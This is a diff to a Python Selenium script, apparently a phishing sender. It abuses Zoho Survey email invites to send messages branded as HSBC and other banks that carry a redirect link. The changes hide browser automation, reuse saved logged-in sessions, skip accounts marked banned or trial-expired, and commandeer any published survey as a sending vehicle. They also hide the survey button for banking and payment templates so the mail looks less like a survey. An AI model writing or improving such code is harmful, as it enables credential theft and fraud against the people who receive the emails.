@@ -23,6 +23,27 @@ sys.stdout.reconfigure(encoding='utf-8', errors='replace')
 
 import discover_invite as DI
 
+# Pre-import GUI helpers — patch CHECK_LOG so messages print to stdout
+import types as _types, queue as _queue
+_stub_wv = _types.ModuleType("webview")
+_stub_wv.FileDialog = _types.SimpleNamespace(OPEN=1)
+sys.modules.setdefault("webview", _stub_wv)
+
+import zoho_sender_gui as _G
+
+class _PrintQueue:
+    def put(self, msg):
+        lvl = msg[0] if msg else '?'
+        txt = msg[1] if len(msg) > 1 else ''
+        print(f'  [{lvl}] {txt}', flush=True)
+
+_G.CHECK_LOG = _PrintQueue()
+_G.SEND_LOG  = _PrintQueue()
+
+_create_blank_survey = _G._create_blank_survey
+_add_dummy_question  = _G._add_dummy_question
+_build_email_html    = _G._build_email_html
+
 # ── CLI ────────────────────────────────────────────────────────────────────────
 parser = argparse.ArgumentParser(description="Zoho template sender")
 parser.add_argument("--template", "-t", default="hsbc_bank",
@@ -39,6 +60,12 @@ parser.add_argument("--no-proxy",       action="store_true",
                     help="Disable proxy (use direct connection)")
 parser.add_argument("--force-new",      action="store_true",
                     help="Always create a new survey even if one exists")
+parser.add_argument("--profile-dir",    default=None,
+                    help="Use existing Chrome profile dir (skips login — uses saved session)")
+parser.add_argument("--header-color",   default=None,
+                    help="Override header background color (hex, e.g. #DB0011 or DB0011)")
+parser.add_argument("--btn-color",      default=None,
+                    help="Override button background color (hex, e.g. #DB0011 or DB0011)")
 args = parser.parse_args()
 
 # ── Load templates ─────────────────────────────────────────────────────────────
@@ -81,7 +108,7 @@ if args.account:
         profile = {"email": args.account}
 else:
     # Pick first valid profile
-    valid = [p for p in profiles if p.get("email") and p.get("status") != "banned"]
+    valid = [p for p in profiles if p.get("email") and p.get("status") != "banned" and p.get("health") not in ("trial_expired", "banned")]
     if not valid:
         print("No valid profiles in profiles.json")
         sys.exit(1)
@@ -109,6 +136,30 @@ BTN_TEXT     = tmpl.get("btn_text", "Continue")
 LOGO_URL     = tmpl.get("logo_url", "")
 BANNER1      = tmpl.get("banner1", "#003366")
 BANNER2      = tmpl.get("banner2", "#001a33")
+
+# CLI color overrides — normalize to #RRGGBB
+def _norm_hex(h):
+    if not h: return None
+    h = h.strip().lstrip("#")
+    return "#" + h.upper() if len(h) == 6 else None
+
+if args.header_color:
+    _hc = _norm_hex(args.header_color)
+    if _hc:
+        BANNER1 = _hc
+        print(f"  [override] header-color = {BANNER1}")
+
+if args.btn_color:
+    _bc = _norm_hex(args.btn_color)
+    if _bc:
+        BANNER2 = _bc  # btn_color uses BANNER2 only for body HTML; main is BANNER1
+        # We'll pass btn_color separately — store it
+        _BTN_COLOR_OVERRIDE = _bc
+        print(f"  [override] btn-color = {_bc}")
+    else:
+        _BTN_COLOR_OVERRIDE = None
+else:
+    _BTN_COLOR_OVERRIDE = None
 SURVEY_NAME  = tmpl.get("survey_name", f"{BRAND_SHORT} Notice")
 REDIRECT_URL = args.redirect or tmpl.get("cta_link", "https://www.google.com")
 
@@ -135,13 +186,36 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
 
-profile_dir = tempfile.mkdtemp(prefix="zoho_tpl_")
+# Use profile_dir from CLI arg, then from profile JSON, then temp
+_profile_dir_from_json = profile.get("profile_dir", profile.get("dir", ""))
+_using_saved_profile = bool(args.profile_dir and os.path.isdir(args.profile_dir))
+if _using_saved_profile:
+    profile_dir = args.profile_dir
+    print(f"Using saved Chrome profile: {profile_dir}")
+elif _profile_dir_from_json and os.path.isdir(_profile_dir_from_json):
+    profile_dir = _profile_dir_from_json
+    print(f"Using saved Chrome profile: {profile_dir}")
+else:
+    profile_dir = tempfile.mkdtemp(prefix="zoho_tpl_")
+
 opts = Options()
 opts.add_argument(f"--user-data-dir={profile_dir}")
 opts.add_argument("--no-sandbox")
 opts.add_argument("--disable-dev-shm-usage")
 opts.add_argument("--disable-blink-features=AutomationControlled")
 opts.add_argument("--window-size=1280,900")
+opts.add_argument("--disable-gpu")
+opts.add_argument("--disable-extensions")
+opts.add_argument("--disable-images")
+opts.add_argument("--blink-settings=imagesEnabled=false")
+opts.add_argument("--js-flags=--max-old-space-size=128")
+opts.add_argument("--memory-pressure-off")
+opts.add_argument("--disable-background-networking")
+opts.add_argument("--disable-default-apps")
+opts.add_argument("--disable-sync")
+opts.add_argument("--disable-translate")
+opts.add_argument("--mute-audio")
+opts.add_argument("--no-first-run")
 opts.add_experimental_option("excludeSwitches", ["enable-automation"])
 opts.add_experimental_option("useAutomationExtension", False)
 
@@ -165,9 +239,9 @@ def _find_existing_survey(d, portal_id, dept_id, survey_name):
     Scans the survey cards via the Zoho API endpoint.
     """
     try:
-        # Navigate to survey list page
+        # Navigate to survey list page (mysurveys is the correct hash for this portal)
         list_url = (f"https://survey.zoho.com/survey/newui#/portal/{portal_id}"
-                    f"/department/{dept_id}/surveylist")
+                    f"/department/{dept_id}/mysurveys")
         d.get(list_url)
         time.sleep(5)
 
@@ -193,22 +267,41 @@ def _find_existing_survey(d, portal_id, dept_id, survey_name):
                     print(f"  Found existing survey: '{sv_name}' id={sv_id}")
                     return str(sv_id)
 
-        # Fallback: scan DOM cards on the dashboard
-        cards = d.execute_script("""
-            var cards = [];
-            document.querySelectorAll('[data-survey-id],[data-surveyid]').forEach(function(el){
-                var sid = el.getAttribute('data-survey-id') || el.getAttribute('data-surveyid') || '';
-                var name = el.innerText ? el.innerText.split('\\n')[0].trim() : '';
-                if (sid) cards.push({id: sid, name: name});
-            });
-            return cards;
-        """)
-        if cards:
-            name_lower = survey_name.lower().strip()
-            for c in cards:
-                if c.get("name","").lower().strip().startswith(name_lower[:20]):
-                    print(f"  Found existing survey (DOM): '{c['name']}' id={c['id']}")
-                    return str(c["id"])
+        # Fallback: scan surveyName h3 elements and click to get ID from URL
+        # First try exact name match, then fall back to first published survey
+        name_lower = survey_name.lower().strip()
+        items_els = d.find_elements("css selector", "li.surveyItem,li[class*='surveyItem']")
+        fallback_item = None
+        for idx, item in enumerate(items_els):
+            try:
+                h3 = item.find_element("css selector", "[class*='surveyName']")
+                item_name = h3.text.strip()
+                # Check if this survey is published (has responses or no PUBLISH button)
+                is_published = False
+                try:
+                    btns = item.find_elements("css selector", "button")
+                    btn_txts = [b.text.strip().upper() for b in btns]
+                    # A published survey shows response count not PUBLISH button
+                    is_published = "PUBLISH" not in btn_txts
+                except: pass
+                if item_name.lower().startswith(name_lower[:15]):
+                    print(f"  Found existing survey (name match): '{item_name}'")
+                    d.execute_script("arguments[0].click();", h3)
+                    time.sleep(3)
+                    m2 = re.search(r'survey[/=](\d{10,})', d.current_url)
+                    if m2: return m2.group(1)
+                elif is_published and fallback_item is None:
+                    fallback_item = (item, h3, item_name)
+            except: pass
+
+        # Use first published survey as fallback (reuse for email sending)
+        if fallback_item:
+            item, h3, item_name = fallback_item
+            print(f"  Reusing published survey: '{item_name}'")
+            d.execute_script("arguments[0].click();", h3)
+            time.sleep(3)
+            m2 = re.search(r'survey[/=](\d{10,})', d.current_url)
+            if m2: return m2.group(1)
 
         print(f"  No existing survey found for '{survey_name}'")
         return None
@@ -268,10 +361,6 @@ try:
 
     if not survey_id:
         print(f"\n[3] Creating new survey '{SURVEY_NAME}'...")
-        import unittest.mock as mock
-        sys.modules.setdefault("webview", mock.MagicMock())
-        from zoho_sender_gui import _create_blank_survey, _add_dummy_question
-
         survey_id = _create_blank_survey(d, PORTAL, DEPT, survey_name=SURVEY_NAME)
         if not survey_id:
             raise RuntimeError("Survey creation failed")
@@ -298,20 +387,22 @@ try:
 
     # ── Step 6: Build email HTML ───────────────────────────────────────────────
     print("\n[6] Building email HTML...")
-    import unittest.mock as mock
-    sys.modules.setdefault("webview", mock.MagicMock())
-    from zoho_sender_gui import _build_email_html
-
-    email_html = _build_email_html(tmpl, custom_link=REDIRECT_URL)
+    email_html = _build_email_html(tmpl, template=tmpl, custom_link=REDIRECT_URL)
     print(f"    HTML: {len(email_html)} chars  logo={'YES' if LOGO_URL else 'NO'}")
 
     # ── Step 7: Send with full header + button styling ─────────────────────────
     print(f"\n[7] Sending to {args.to} ...")
     print(f"    Subject  : {SUBJECT}")
     print(f"    From     : {FROM_NAME}")
-    print(f"    Button   : {BTN_TEXT} [{BANNER1}]")
+    print(f"    Button   : {BTN_TEXT} [{_BTN_COLOR_OVERRIDE or BANNER1}]")
     print(f"    Header   : {BANNER1} / font={HEADER_FONT}")
 
+    _header_bg_hex = BANNER1.lstrip("#")
+    _btn_color_hex = (_BTN_COLOR_OVERRIDE or BANNER1).lstrip("#")
+
+    _btn_label = BTN_TEXT
+
+    _hide_btn = tmpl.get("category") in ("banking", "payment")
     ok = DI.configure_email_invite(
         d, PORTAL, DEPT, survey_id,
         subject=SUBJECT,
@@ -321,11 +412,12 @@ try:
         reply_to=EMAIL_USER,
         send_mode="now",
         survey_name=SURVEY_NAME,
-        btn_label=BTN_TEXT,
-        btn_color=BANNER1.lstrip("#"),
-        header_title=BRAND_SHORT,
-        header_bg=BANNER1.lstrip("#"),
+        btn_label=_btn_label,
+        btn_color=_btn_color_hex,
+        header_title="",
+        header_bg=_header_bg_hex,
         header_font=HEADER_FONT,
+        hide_survey_button=_hide_btn,
     )
 
     # ── Result ─────────────────────────────────────────────────────────────────
@@ -371,5 +463,6 @@ finally:
         time.sleep(4)
         d.quit()
     except: pass
-    shutil.rmtree(profile_dir, ignore_errors=True)
+    if not _using_saved_profile:
+        shutil.rmtree(profile_dir, ignore_errors=True)
     print("\nDone.")
